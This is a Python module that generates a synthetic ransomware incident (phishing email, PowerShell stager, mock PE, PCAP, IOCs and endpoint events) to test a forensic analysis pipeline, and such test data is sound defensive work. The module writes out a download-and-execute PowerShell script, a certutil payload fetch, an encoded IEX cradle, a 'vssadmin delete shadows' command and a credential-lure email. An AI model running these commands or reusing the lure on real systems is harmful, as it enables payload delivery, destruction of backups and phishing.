"""Prepared ransomware investigation scenario for RansomEye competition & demonstration.

Provenance: Controlled synthetic test data generated strictly for DFIR pipeline
validation and capability demonstrations. Uses RFC 5737 reserved documentation
subnets (198.51.100.0/24, 203.0.113.0/24) and synthetic '.test' domains.
Never represents live malicious infrastructure, personal data, or customer systems.
"""

from __future__ import annotations

import json
import logging
import socket
import struct
from pathlib import Path
from typing import Any

from ransomeye.commands import ingest_evidence
from ransomeye.integrity import sha256_file
from ransomeye.ioc_extractor import IocExtractor, ingest_ioc_finding
from ransomeye.pcap_analyzer import PcapAnalyzer, ingest_pcap_finding
from ransomeye.phishing import MessagePayload, PhishingDetector, ingest_phishing_finding
from ransomeye.script_analyzer import ScriptAnalyzer, ingest_script_finding
from ransomeye.static_analyzer import StaticAnalyzer, ingest_static_finding
from ransomeye.storage import EvidenceStore
from ransomeye.threat_assessment import assess_case

logger = logging.getLogger(__name__)

PREPARED_CASE_ID = "CASE-2026-ENC-01"
PREPARED_CASE_NAME = "Suspicious File Encryption and Recovery-Inhibition Activity"
PREPARED_HOST = "SEC-CORP-EP01"

# --------------------------------------------------------------------------- #
# Synthetic Artifact Builders
# --------------------------------------------------------------------------- #

PCAP_MAGIC_LE = b"\xd4\xc3\xb2\xa1"
LINKTYPE_ETHERNET = 1


def _global_header(linktype: int = LINKTYPE_ETHERNET) -> bytes:
    return PCAP_MAGIC_LE + struct.pack("<HHiIII", 2, 4, 0, 0, 65535, linktype)


def _ethernet_frame(payload: bytes, ethertype: int = 0x0800) -> bytes:
    return b"\x00" * 6 + b"\x01" * 6 + struct.pack("!H", ethertype) + payload


def _ipv4_header(proto: int, total_len: int, src: str = "10.0.0.42", dst: str = "198.51.100.45") -> bytes:
    return struct.pack(
        "!BBHHHBBH4s4s", 0x45, 0, total_len, 0, 0, 64, proto, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def _udp_dns_packet(
    qname: str,
    qtype: int = 1,
    src_ip: str = "10.0.0.42",
    dst_ip: str = "8.8.8.8",
    src_port: int = 54321,
    dst_port: int = 53,
    txid: int = 0x1234,
) -> bytes:
    labels = b""
    for part in qname.split("."):
        enc = part.encode("ascii")
        labels += bytes([len(enc)]) + enc
    labels += b"\x00"
    dns = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + labels + struct.pack("!HH", qtype, 1)
    udp = struct.pack("!HHHH", src_port, dst_port, 8 + len(dns), 0) + dns
    ip = _ipv4_header(17, 20 + len(udp), src=src_ip, dst=dst_ip)
    return _ethernet_frame(ip + udp)


def _tcp_syn_packet(src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bytes:
    tcp = struct.pack("!HHIIBBHHH", src_port, dst_port, 1, 0, 0x50, 0x02, 65535, 0, 0)
    ip = _ipv4_header(6, 20 + len(tcp), src=src_ip, dst=dst_ip)
    return _ethernet_frame(ip + tcp)


def _pack_record(packet: bytes, ts_sec: int = 1791532930, ts_usec: int = 0) -> bytes:
    return struct.pack("<IIII", ts_sec, ts_usec, len(packet), len(packet)) + packet


def build_synthetic_pcap() -> bytes:
    """Build a deterministic synthetic PCAP capture reflecting incident traffic."""
    dns_pkt = _udp_dns_packet("c2-beacon.corp-notice.test", dst_ip="8.8.8.8")
    syn_pkt = _tcp_syn_packet("10.0.0.42", "198.51.100.45", 52140, 8443)
    buf = _global_header()
    buf += _pack_record(dns_pkt, ts_sec=1791532930)
    buf += _pack_record(syn_pkt, ts_sec=1791532932)
    return buf


def build_synthetic_pe_binary() -> bytes:
    """Build a safe, inert PE mock binary with entropy, suspicious APIs, and ransom string."""
    header = (
        b"MZ\x00\x00\x90\x00\x03\x00"
        + b"\x00" * 56
        + b"\x80\x00\x00\x00"
        + b"\x00" * 64
        + b"PE\x00\x00"
        + b"\x4c\x01\x01\x00"  # Machine: i386, NumberOfSections: 1
        + b"\x00" * 16
    )
    # Mock payload containing suspicious imported APIs and ransom text
    apis = b"CryptEncrypt CryptAcquireContextW VirtualAlloc CreateProcessW "
    ransom_text = b"HOW_TO_DECRYPT_FILES.txt contact recovery@threat-decrypt.test "
    # Pseudo-random packed byte sequence to exhibit high Shannon entropy in static analysis
    high_entropy_bytes = bytes((i * 101 + 37) % 256 for i in range(1024))
    return header + apis + ransom_text + high_entropy_bytes


def build_prepared_artifacts(dest_dir: Path) -> dict[str, Path]:
    """Generate the synthetic evidence files for the prepared investigation case."""
    dest_dir.mkdir(parents=True, exist_ok=True)
    artifacts: dict[str, Path] = {}

    # 1. Phishing Email
    eml_path = dest_dir / "suspicious_notice.eml"
    eml_content = (
        "From: \"Corporate IT Compliance\" <hr-compliance@corp-verify-notice.test>\n"
        "To: <analyst@internal-corp.test>\n"
        "Subject: Urgent: Mandatory Security Policy Verification Required\n"
        "Date: Fri, 09 Oct 2026 07:55:00 +0000\n"
        "Message-ID: <compliance-notice-20261009-001@corp-verify-notice.test>\n"
        "MIME-Version: 1.0\n"
        "Content-Type: text/plain; charset=\"utf-8\"\n\n"
        "CRITICAL COMPLIANCE NOTICE:\n\n"
        "All corporate staff must verify and register their updated workstation endpoint credentials within 24 hours.\n"
        "Failure to complete the mandatory certificate update will lead to immediate account suspension and revocation of network access.\n\n"
        "To verify your workstation certificate, retrieve your token from the internal server:\n"
        "http://198.51.100.45/verify_token.ps1\n\n"
        "Corporate Information Security Operations\n"
        "Internal Support Desk\n"
    )
    eml_path.write_text(eml_content, encoding="utf-8")
    artifacts["eml"] = eml_path

    # 2. PowerShell Script Artifact
    ps_path = dest_dir / "verify_token.ps1"
    ps_content = (
        "# Synthetic Staging Script for Ransomware Analysis\n"
        "$WebClient = New-Object System.Net.WebClient\n"
        "$WebClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n"
        "$payloadUrl = 'http://198.51.100.45:8443/stage2.bin'\n"
        "$destPath = \"$env:TEMP\\update_agent.exe\"\n"
        "Write-Output \"Retrieving payload from $payloadUrl...\"\n"
        "$WebClient.DownloadFile($payloadUrl, $destPath)\n"
        "Start-Process -FilePath $destPath -ArgumentList '--encrypt'\n"
    )
    ps_path.write_text(ps_content, encoding="utf-8")
    artifacts["script"] = ps_path

    # 3. Executable Payload
    exe_path = dest_dir / "update_agent.exe"
    exe_path.write_bytes(build_synthetic_pe_binary())
    artifacts["executable"] = exe_path

    # 4. PCAP Capture
    pcap_path = dest_dir / "network_traffic.pcap"
    pcap_path.write_bytes(build_synthetic_pcap())
    artifacts["pcap"] = pcap_path

    # 5. IOC Text File
    ioc_path = dest_dir / "indicators.txt"
    ioc_content = (
        "=== RANSOMEYE CONTROLLED SYNTHETIC INCIDENT OBSERVABLES ===\n"
        "Case ID: CASE-2026-ENC-01\n"
        "Scenario: Suspicious File Encryption and Recovery-Inhibition Activity\n"
        "Provenance: Controlled synthetic test dataset. Reserved RFC 5737 documentation networks.\n\n"
        "C2 Infrastructure IPs:\n"
        "198.51.100.45\n"
        "203.0.113.88\n\n"
        "Host C2 Domains:\n"
        "corp-verify-notice.test\n"
        "c2-beacon.corp-notice.test\n\n"
        "Observed LOLBin Invocation:\n"
        "certutil.exe -urlcache -split -f http://198.51.100.45:8443/stage2.bin\n"
        "vssadmin.exe delete shadows /all /quiet\n\n"
        "Threat Hashes (SHA-256):\n"
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
        "a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef\n\n"
        "Contact & Decryption Wallet Candidate:\n"
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
    )
    ioc_path.write_text(ioc_content, encoding="utf-8")
    artifacts["ioc"] = ioc_path

    # 6. JSON Event Log File (Sysmon + File System activity)
    events_json_path = dest_dir / "endpoint_events.json"
    events = build_endpoint_events()
    events_json_path.write_text(json.dumps(events, indent=2), encoding="utf-8")
    artifacts["events"] = events_json_path

    return artifacts


def build_endpoint_events() -> list[dict[str, Any]]:
    """Build the normalized sequential events simulating the ransomware attack progression."""
    events: list[dict[str, Any]] = [
        # Event 1: Initial Execution via PowerShell (User launched script)
        {
            "event_id": "EVT-ENC-001",
            "timestamp": "2026-10-09T08:02:10Z",
            "source": "sysmon",
            "event_type": "process_create",
            "process_name": "powershell.exe",
            "pid": 4120,
            "parent_pid": 1840,
            "process_guid": "{A1B2C3D4-0001-4444-8888-111111111111}",
            "parent_process_guid": "{00000000-0000-0000-0000-000000001840}",
            "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==",
            "image_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Windows\explorer.exe",
        },
        # Event 2: Stage 2 Retrieval using CertUtil LOLBin
        {
            "event_id": "EVT-ENC-002",
            "timestamp": "2026-10-09T08:02:18Z",
            "source": "sysmon",
            "event_type": "process_create",
            "process_name": "certutil.exe",
            "pid": 4892,
            "parent_pid": 4120,
            "process_guid": "{A1B2C3D4-0002-4444-8888-222222222222}",
            "parent_process_guid": "{A1B2C3D4-0001-4444-8888-111111111111}",
            "command_line": r"certutil.exe -urlcache -split -f http://198.51.100.45:8443/stage2.bin C:\Users\analyst\AppData\Local\Temp\update_agent.exe",
            "image_path": r"C:\Windows\System32\certutil.exe",
            "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        },
        # Event 3: Outbound Network Connection to Documentation C2 IP
        {
            "event_id": "EVT-ENC-003",
            "timestamp": "2026-10-09T08:02:22Z",
            "source": "sysmon",
            "event_type": "network_connect",
            "process_name": "powershell.exe",
            "pid": 4120,
            "process_guid": "{A1B2C3D4-0001-4444-8888-111111111111}",
            "network": {
                "destination_ip": "198.51.100.45",
                "destination_port": 8443,
                "protocol": "tcp",
            },
        },
        # Event 4: Execution of Dropped Executable
        {
            "event_id": "EVT-ENC-004",
            "timestamp": "2026-10-09T08:02:30Z",
            "source": "sysmon",
            "event_type": "process_create",
            "process_name": "update_agent.exe",
            "pid": 5560,
            "parent_pid": 4120,
            "process_guid": "{A1B2C3D4-0003-4444-8888-333333333333}",
            "parent_process_guid": "{A1B2C3D4-0001-4444-8888-111111111111}",
            "command_line": r"C:\Users\analyst\AppData\Local\Temp\update_agent.exe --encrypt",
            "image_path": r"C:\Users\analyst\AppData\Local\Temp\update_agent.exe",
            "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        },
        # Event 5: Recovery Inhibition (VSS Shadow Copy Deletion)
        {
            "event_id": "EVT-ENC-005",
            "timestamp": "2026-10-09T08:02:34Z",
            "source": "sysmon",
            "event_type": "process_create",
            "process_name": "vssadmin.exe",
            "pid": 6104,
            "parent_pid": 5560,
            "process_guid": "{A1B2C3D4-0004-4444-8888-444444444444}",
            "parent_process_guid": "{A1B2C3D4-0003-4444-8888-333333333333}",
            "command_line": "vssadmin.exe delete shadows /all /quiet",
            "image_path": r"C:\Windows\System32\vssadmin.exe",
            "parent_image": r"C:\Users\analyst\AppData\Local\Temp\update_agent.exe",
        },
    ]

    # Events 6 to 58: 53 Rapid File Modifications (Burst >= 50 within 10s to trigger mass_file_modification)
    for i in range(1, 54):
        sec_offset = (i // 7)  # Spread over ~8 seconds (08:02:36 to 08:02:44)
        ts = f"2026-10-09T08:02:{36 + sec_offset:02d}Z"
        events.append({
            "event_id": f"EVT-ENC-{i+5:03d}",
            "timestamp": ts,
            "source": "live_file",
            "event_type": "file_modify",
            "process_name": "update_agent.exe",
            "pid": 5560,
            "process_guid": "{A1B2C3D4-0003-4444-8888-333333333333}",
            "file_path": rf"C:\Users\analyst\Documents\Corporate_Financial_Plan_{i:02d}.xlsx",
            "metadata": {"scenario": "encryption_burst", "file_number": i},
        })

    # Event 60: Ransom Note Creation
    events.append({
        "event_id": "EVT-ENC-060",
        "timestamp": "2026-10-09T08:02:48Z",
        "source": "live_file",
        "event_type": "file_create",
        "process_name": "update_agent.exe",
        "pid": 5560,
        "process_guid": "{A1B2C3D4-0003-4444-8888-333333333333}",
        "file_path": r"C:\Users\analyst\Desktop\HOW_TO_DECRYPT_FILES.txt",
        "metadata": {"scenario": "ransom_note_dropped"},
    })

    # Event 61: DNS Query for C2 Beacon
    events.append({
        "event_id": "EVT-ENC-061",
        "timestamp": "2026-10-09T08:02:52Z",
        "source": "sysmon",
        "event_type": "dns_query",
        "process_name": "update_agent.exe",
        "pid": 5560,
        "process_guid": "{A1B2C3D4-0003-4444-8888-333333333333}",
        "network": {
            "query_name": "c2-beacon.corp-notice.test",
            "query_results": "198.51.100.45",
        },
    })

    return events


# --------------------------------------------------------------------------- #
# Case Seeder Engine
# --------------------------------------------------------------------------- #

def seed_prepared_case(
    database_path: Path | str,
    artifacts_dir: Path | str | None = None,
) -> dict[str, Any]:
    """Deterministically seed the competition prepared ransomware case.

    Ingests:
    1. Base sequential endpoint events (Process execution, CertUtil, Network, Shadow copy deletion, Mass file encryption, Ransom note).
    2. Phishing analyzer verdict from synthetic lure.
    3. Script analyzer verdict from staging script.
    4. Static PE analyzer verdict from dropped payload.
    5. PCAP network flow and DNS analysis verdict.
    6. IOC extraction verdict from host observables.
    7. Chain of custody events and recalculates unified threat assessment.
    """
    db_path = Path(database_path)
    if artifacts_dir is None:
        art_dir = Path("samples") / "prepared_case"
    else:
        art_dir = Path(artifacts_dir)

    artifacts = build_prepared_artifacts(art_dir)
    store = EvidenceStore(db_path)

    try:
        # Step 1: Ensure case exists
        existing = store.get_case(PREPARED_CASE_ID)
        if not existing:
            store.create_case(
                case_id=PREPARED_CASE_ID,
                case_name=PREPARED_CASE_NAME,
                host=PREPARED_HOST,
            )

        # Step 2: Ingest Base Endpoint Events
        ingest_summary = ingest_evidence(
            database_path=db_path,
            case_id=PREPARED_CASE_ID,
            file_path=artifacts["events"],
            format_type="json",
            case_name=PREPARED_CASE_NAME,
            host=PREPARED_HOST,
        )

        # Record custody for raw events file
        store.record_custody_event(
            case_id=PREPARED_CASE_ID,
            artifact_path=str(artifacts["events"].resolve()),
            sha256=sha256_file(artifacts["events"]),
            action="created",
            analyst="analyst@ransomeye.local",
            note="Initial ingestion of normalized synthetic telemetry events",
        )

        # Step 3: Phishing Analyzer Ingestion
        phish_payload = MessagePayload.from_email_file(artifacts["eml"])
        phish_result = PhishingDetector().analyze(phish_payload)
        phish_finding_id = ingest_phishing_finding(
            store=store,
            case_id=PREPARED_CASE_ID,
            result=phish_result,
            source_artifact=str(artifacts["eml"].name),
            payload=phish_payload,
        )

        # Step 4: Script Analyzer Ingestion
        script_result = ScriptAnalyzer().analyze_file(str(artifacts["script"]), language="powershell")
        script_finding_ids = ingest_script_finding(
            store=store,
            case_id=PREPARED_CASE_ID,
            result=script_result,
        )

        # Step 5: Static Binary Analyzer Ingestion
        static_result = StaticAnalyzer().analyze_file(artifacts["executable"])
        static_finding_id = ingest_static_finding(
            store=store,
            case_id=PREPARED_CASE_ID,
            result=static_result,
        )

        # Step 6: PCAP Network Analyzer Ingestion
        pcap_result = PcapAnalyzer().analyze_file(str(artifacts["pcap"]))
        pcap_finding_ids = ingest_pcap_finding(
            store=store,
            case_id=PREPARED_CASE_ID,
            result=pcap_result,
        )

        # Step 7: IOC Extractor Ingestion
        ioc_result = IocExtractor().analyze_file(str(artifacts["ioc"]))
        ioc_finding_ids = ingest_ioc_finding(
            store=store,
            case_id=PREPARED_CASE_ID,
            result=ioc_result,
        )

        # Step 8: Additional Operational Chain-of-Custody Records
        store.record_custody_event(
            case_id=PREPARED_CASE_ID,
            artifact_path="INVESTIGATION-CASE-TRIAGE",
            sha256="0" * 64,
            action="reviewed",
            analyst="analyst@ransomeye.local",
            note="Multi-stage ransomware behavioral attack chain identified and triaged",
        )

        # Step 9: Recompute and Persist Unified Threat Assessment
        assessment = assess_case(store, PREPARED_CASE_ID)

        # Query final counts for summary return
        events_count = store.connection.execute(
            "SELECT COUNT(*) FROM events WHERE case_id = ?", (PREPARED_CASE_ID,)
        ).fetchone()[0]
        findings_count = store.connection.execute(
            "SELECT COUNT(*) FROM findings WHERE case_id = ?", (PREPARED_CASE_ID,)
        ).fetchone()[0]
        custody_count = store.connection.execute(
            "SELECT COUNT(*) FROM case_custody WHERE case_id = ?", (PREPARED_CASE_ID,)
        ).fetchone()[0]

        return {
            "case_id": PREPARED_CASE_ID,
            "case_name": PREPARED_CASE_NAME,
            "host": PREPARED_HOST,
            "events_count": events_count,
            "findings_count": findings_count,
            "custody_count": custody_count,
            "score": assessment.get("score"),
            "severity": assessment.get("severity"),
            "confidence": assessment.get("confidence"),
            "correlations_count": len(assessment.get("correlations", [])),
            "reasons": assessment.get("reasons", []),
            "techniques": assessment.get("techniques", []),
            "phish_finding_id": phish_finding_id,
            "script_finding_ids": script_finding_ids,
            "static_finding_id": static_finding_id,
            "pcap_finding_ids": pcap_finding_ids,
            "ioc_finding_ids": ioc_finding_ids,
        }
    finally:
        store.close()
